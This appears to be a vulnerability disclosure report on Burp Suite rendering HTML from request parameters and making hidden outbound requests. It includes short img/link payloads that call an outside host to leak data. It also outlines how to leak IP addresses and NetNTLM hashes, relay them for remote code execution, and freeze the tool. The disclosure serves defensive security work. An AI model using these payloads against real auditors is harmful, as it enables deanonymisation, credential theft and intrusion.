## Original Report

The vulnerability is like a SSRF but on the client side, where an attacker can force an unsolicited hidden request made by Burp Suite when the victim performs some actions.
During normal browsing to a website through Burp Suite (Pro or Community), if the website makes a request with HTML code in a GET parameter or in a POST body, and the auditor (the victim):
- Intercepts that request, or
- Selects that request in HTTP history (Proxy tab), or
- Sends that request to repeater, or
- In repeater, makes any change to the HTML code (preserving the main structure),

Burp Suite will do an unsolicited hidden request to the destination specified in the "img" or "link" HTML tags.

Next, you can see a GET and a POST example that trigger an unsolicited hidden request to "http://www.rec2.ml/leak" just by pasting them on a repeater tab:

## GET request (using the "img" tag)
```
GET /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'> HTTP/1.1
```

## POST request (using the "link" tag)
```
POST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

=<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>
```
In fact, a smaller payload to produce the same behaviour can be achieved by pasting the following on a repeater tab:
```
?=<html><img+src='http://www.rec2.ml/leak'>
```

## Impact

An attacker can exploit this vulnerability in at least 4 different ways:


##1. Real public IP address leak

The unsolicited hidden request does not respect the configuration in User options tab:
- Upstream Proxy Servers
- SOCKS proxy

An auditor (the victim), trying to hide his real public IP address from an audited website (using an upstream proxy server or a SOCKS proxy), would be leaking it without being aware of this fact.

Affected OS: Linux, MacOS, Windows

##2. Windows NetNTLM hashes leak

If the HTML code uses the “file://” scheme instead of the “http[s]://” , it will produce an unsolicited hidden request using the SMB protocol that will negotiate and leak the auditor's:
- Username
- Computer name or domain
- NetNTLM hash

The NetNTLM can be cracked and therefore used at a later stage.
To negotiate and get the NetNTLM hash an attacker can use Responder (https://github.com/lgandx/Responder).

Affected OS: Windows

##3. RCE on other machines

To perform this attack in the best scenario, an attacker must be on the same internal network with network visibility with the victim (auditor).
This attack is a variant of the previous one (2. Windows NetNTLM hashes leak) in which, instead of cracking the NetNTLM hash, the attacker does a MiTM to relay the SMB negotiation to other machines (without SMB signing enabled) and obtain a RCE in the context of the victim.

The HTML code must also use the “file://” scheme instead of the “http[s]://” , to produce an unsolicited hidden request using the SMB protocol.
To relay the SMB negotiation an attacker can use ntlmrelayx (https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).

##4. Denial of Service (DoS).

If the attacker does not respond to the unsolicited hidden request made by Burp Suite and keeps the TCP connection open, then it can freeze Burp Suite execution, forcing the auditor (victim) to lose the unsaved changes.
